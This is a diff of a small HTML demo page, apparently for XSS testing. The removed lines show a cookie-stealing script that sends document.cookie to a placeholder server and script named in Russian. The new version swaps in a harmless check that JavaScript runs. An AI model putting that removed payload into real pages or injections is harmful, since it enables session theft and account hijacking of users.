@@ -1,15 +1,15 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>XSS Demo</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Test</title>
 </head>
 <body>
-
-<h1>XSS Demo</h1>
-
-<script>
-  document.write('<img src="http://ваш_сервер/ваш_скрипт.php?cookie=' + encodeURIComponent(document.cookie) + '">');
-</script>
-
+  <h1>XSS Test</h1>
+  <p>Если этот текст виден, значит, JavaScript работает:</p>
+  <script>
+    document.write('<p>JavaScript работает!</p>');
+  </script>
 </body>
 </html>
